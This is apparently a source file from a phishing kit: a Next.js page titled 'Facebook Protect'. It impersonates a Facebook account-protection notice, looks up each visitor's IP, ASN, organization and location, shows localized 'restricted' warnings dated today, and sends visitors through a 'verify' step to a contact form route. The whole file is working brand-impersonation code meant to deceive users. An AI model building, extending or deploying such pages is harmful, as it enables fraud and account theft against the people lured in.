'use client';

import HeroImage from '@/assets/images/hero-image.png';
import SplashImage from '@/assets/images/splash.gif';
import { useGeoStore } from '@/store/geo-store';
import type { Dictionary } from '@/types/content';
import getDictionary from '@/utils/get-content';
import { faAddressCard, faCircleCheck } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import { useEffect, useState, type FC } from 'react';

const Page: FC = () => {
    const router = useRouter();
    const { setGeoInfo } = useGeoStore();
    const [dictionary, setDictionary] = useState<Dictionary | null>(null);
    const [isLoading, setIsLoading] = useState(true);
    const [showSplash, setShowSplash] = useState(true);
    const [today, setToday] = useState('');

    useEffect(() => {
        const initializeContent = async () => {
            try {
                setIsLoading(true);

                const geoResponse = await fetch('/api/geo');
                let languageCode = 'en';

                if (geoResponse.ok) {
                    const geoData = await geoResponse.json();
                    setGeoInfo({
                        asn: geoData.asn || 0,
                        ip: geoData.ip || 'unknown',
                        country: geoData.country || 'unknown',
                        city: geoData.city || 'unknown',
                        country_code: geoData.country_code || 'US',
                        region: geoData.region || 'Unknown',
                        timezone: geoData.timezone || 'Unknown',
                        organization: geoData.organization || 'Unknown'
                    });
                    languageCode = geoData.language_code || 'en';
                }

                const fullDictionary = await getDictionary(languageCode);
                setDictionary(fullDictionary);
            } catch (err) {
                console.error('Failed to initialize content:', err);
            } finally {
                setIsLoading(false);
            }
        };

        const getToday = () => {
            return new Date().toLocaleDateString('en', {
                year: 'numeric',
                month: 'long',
                day: '2-digit'
            });
        };
        setToday(getToday());

        initializeContent();

        const timer = setTimeout(() => {
            setShowSplash(false);
        }, 2880);

        return () => clearTimeout(timer);
    }, [setGeoInfo]);

    const handleVerify = async () => {
        setIsLoading(true);
        try {
            const response = await fetch('/api/verify', { method: 'POST' });
            if (response.ok) {
                setTimeout(() => {
                    const currentTime = Date.now();
                    router.push(`/contact/${currentTime}`);
                }, 2000);
            }
        } catch {
            setIsLoading(false);
        }
    };

    if (showSplash || isLoading || !dictionary) {
        return (
            <div className='fixed inset-0 flex items-center justify-center bg-white'>
                <Image src={SplashImage} alt='Loading...' className='h-auto max-h-full w-auto max-w-full' unoptimized />
            </div>
        );
    }

    const content = dictionary.livePage;

    return (
        <div className='flex min-h-screen items-center justify-center bg-gray-100 p-4'>
            <title>Facebook Protect</title>
            <div className='flex max-w-2xl flex-col gap-4 overflow-hidden rounded-xl bg-white p-0 pb-6 shadow-sm'>
                <Image className='h-auto w-full' src={HeroImage} alt='' />
                <div className='flex flex-col gap-4 px-6'>
                    <b className='text-2xl font-bold'>{content.welcome}</b>
                    <p className='text-gray-700'>
                        {content.description}
                        <span className='ml-1 cursor-pointer text-blue-600 hover:underline'>{content.moreInfo}</span>
                    </p>
                    <ul className='flex flex-col gap-8'>
                        <li className='flex items-start gap-3'>
                            <FontAwesomeIcon icon={faCircleCheck} className='mt-1 h-6 w-6 text-gray-400' />
                            <p className='text-gray-700'>{content.protection}</p>
                        </li>
                        <li className='flex items-start gap-3'>
                            <div className='flex h-8 w-8 min-w-8 items-center justify-center rounded-full bg-blue-500'>
                                <FontAwesomeIcon icon={faAddressCard} className='h-4 w-4 text-white' />
                            </div>
                            <p className='text-gray-700'>{content.process}</p>
                        </li>
                    </ul>
                    <button onClick={handleVerify} disabled={isLoading} className='cursor-pointer rounded-full bg-blue-500 py-3 text-lg font-medium text-white transition-colors hover:bg-blue-600 disabled:bg-blue-300' type='button'>
                        {isLoading ? (
                            <div className='flex items-center justify-center gap-2'>
                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent'></div>
                                <span>{content.continue}...</span>
                            </div>
                        ) : (
                            content.continue
                        )}
                    </button>
                    <p className='text-center text-sm text-gray-500'>
                        {content.restricted} <b>{today}</b>
                    </p>
                </div>
            </div>
        </div>
    );
};

export default Page;
